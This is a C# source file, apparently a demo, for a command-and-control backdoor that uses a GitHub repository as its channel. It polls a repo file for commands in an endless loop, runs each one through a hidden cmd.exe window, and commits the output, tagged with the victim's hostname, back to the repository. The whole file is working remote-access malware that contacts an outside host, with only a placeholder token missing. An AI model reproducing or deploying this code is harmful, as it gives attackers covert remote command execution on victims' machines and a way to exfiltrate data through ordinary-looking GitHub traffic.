using Octokit;
using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace democ2
{
    internal class Program
    {
        private const string GitHubToken = "token_aqui";
        private const string RepositoryOwner = "Diego-h204";
        private const string RepositoryName = "demo-c2-github";
        private const string FilePath = "input.txt";
        private const string OutputFilePath = "output.txt";

        static async Task Main(string[] args)
        {
            var client = new GitHubClient(new ProductHeaderValue("v3nuz"));

            var tokenAuth = new Credentials(GitHubToken);
            client.Credentials = tokenAuth;

            while (true)
            {
                var fileContent = await client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, FilePath);
                var inputCmd = fileContent[0].Content;

                if (!string.IsNullOrEmpty(inputCmd))
                {
                    string cmdResults = ExecuteCommand(inputCmd);

                    // 1. Obtener el nombre del equipo
                    string hostname = Environment.MachineName;
                    string commitMessage = $"Update from {hostname}";

                    // 2. Obtener el contenido actual para el SHA
                    var contents = client.Repository.Content.GetAllContents(RepositoryOwner, RepositoryName, OutputFilePath).Result;
                    var outputFileContent = contents[0];

                    // 3. Crear el request con el nuevo mensaje dinámico
                    var updateRequest = new UpdateFileRequest(commitMessage, cmdResults, outputFileContent.Sha);

                    // 4. Ejecutar la actualización
                    client.Repository.Content.UpdateFile(RepositoryOwner, RepositoryName, OutputFilePath, updateRequest).Wait();

                }

                Thread.Sleep(2000);
            }

        }
        static string ExecuteCommand(string command)
        {
            var processStartInfo = new ProcessStartInfo("cmd.exe /k")
            {
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            var process = new Process { StartInfo = processStartInfo };
            process.Start();

            process.StandardInput.WriteLine(command);
            process.StandardInput.Close();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            return output;
        }
    }
}
